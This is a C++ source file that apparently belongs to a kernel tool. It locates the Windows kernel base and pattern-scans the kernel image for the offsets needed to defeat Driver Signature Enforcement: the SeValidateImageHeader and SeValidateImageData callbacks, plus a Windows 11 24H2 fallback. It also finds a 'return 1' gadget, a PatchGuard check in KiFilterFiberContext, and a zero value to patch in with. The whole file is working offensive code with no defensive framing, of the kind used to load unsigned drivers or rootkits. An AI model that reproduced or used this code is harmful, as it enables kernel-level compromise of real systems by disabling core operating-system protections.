#include <Kernel/KernelEnvironment.hpp>
#include <Psapi.h>
#include <iostream>

namespace Agdl::Kernel
{
    Common::Address_t AgdlKernelEnvironment::GetKernelBase() noexcept
    {
        DWORD bytesNeeded = 0;
        LPVOID driverBases[1024]{};

        if (EnumDeviceDrivers(driverBases, sizeof(driverBases), &bytesNeeded) && bytesNeeded > 0)
        {
            return reinterpret_cast<Common::Address_t>(driverBases[0]);
        }
        return Common::InvalidAddress;
    }

    Common::Offset_t AgdlKernelEnvironment::ResolveRipRelative(
        Common::Address_t matchAddress,
        std::uint32_t ripOffsetFromMatch,
        std::uint32_t instructionLength,
        Common::Address_t imageBase
    ) noexcept
    {
        if (matchAddress == Common::InvalidAddress) return 0;

        const auto ripOffsetPtr = reinterpret_cast<const std::int32_t*>(matchAddress + ripOffsetFromMatch);
        const auto targetAddress = matchAddress + instructionLength + *ripOffsetPtr;

        return static_cast<Common::Offset_t>(targetAddress - imageBase);
    }

    std::optional<AgdlSystemOffsets> AgdlKernelEnvironment::ResolveOffsets(const Scanning::AgdlModuleScanner& kernelImage) noexcept
    {
        if (!kernelImage.IsLoaded()) return std::nullopt;

        AgdlSystemOffsets offsets{};
        const auto base = kernelImage.GetBaseAddress();

        // 1. DSE - SeValidateImageHeader
        auto sigSeHeader = Scanning::AgdlSignaturePattern::Parse(
            "SeValidateImageHeader",
            "48 39 35 ? ? ? ? 48 8B F9 48 89 70 F0 44 8B DE"
        );
        auto addrSeHeader = kernelImage.FindPattern(sigSeHeader);

        if (addrSeHeader != Common::InvalidAddress)
        {
            offsets.SeValidateImageHeader = ResolveRipRelative(addrSeHeader, 3, 7, base);
        }
        else
        {
            // Windows 11 24H2+ fallback (MiValidateSectionCreate -> SeCiCallbacks)
            auto sigMiSection = Scanning::AgdlSignaturePattern::Parse(
                "MiValidateSectionCreate",
                "48 83 3D ? ? ? 00 00 0F 84 DB"
            );
            auto addrMiSection = kernelImage.FindPattern(sigMiSection);
            if (addrMiSection != Common::InvalidAddress)
            {
                offsets.SeValidateImageHeader = ResolveRipRelative(addrMiSection, 3, 8, base);
            }
        }

        // 2. DSE - SeValidateImageData
        auto sigSeData = Scanning::AgdlSignaturePattern::Parse(
            "SeValidateImageData",
            "48 8B 05 ? ? ? ? 4C 8B D1 48 85 C0 74 ?"
        );
        auto addrSeData = kernelImage.FindPattern(sigSeData);
        if (addrSeData != Common::InvalidAddress)
        {
            offsets.SeValidateImageData = ResolveRipRelative(addrSeData, 3, 7, base);
        }

        // 3. RET Gadget (mov eax, 1; ret)
        auto sigRet = Scanning::AgdlSignaturePattern::Parse(
            "RetSuccessGadget",
            "B8 01 00 00 00 C3"
        );
        auto addrRet = kernelImage.FindPattern(sigRet, ".text");
        if (addrRet != Common::InvalidAddress)
        {
            offsets.RetGadget = static_cast<Common::Offset_t>(addrRet - base);
        }

        // 4. PatchGuard Callback in KiFilterFiberContext
        auto sigPg = Scanning::AgdlSignaturePattern::Parse(
            "PatchGuardKdCheck",
            "38 0D ? ? ? ? 75 02 EB FE"
        );
        auto addrPg = kernelImage.FindPattern(sigPg);
        if (addrPg != Common::InvalidAddress)
        {
            offsets.PatchGuardCallback = ResolveRipRelative(addrPg, 2, 6, base);
        }

        // 5. Zero value reference in .rdata
        auto sigZero = Scanning::AgdlSignaturePattern::Parse(
            "ZeroQword",
            "00 00 00 00 00 00 00 00"
        );
        auto addrZero = kernelImage.FindPattern(sigZero, ".rdata");
        if (addrZero != Common::InvalidAddress)
        {
            offsets.PatchGuardZeroValue = static_cast<Common::Offset_t>(addrZero - base);
        }

        if (!offsets.IsComplete())
        {
            return std::nullopt;
        }

        return offsets;
    }
}
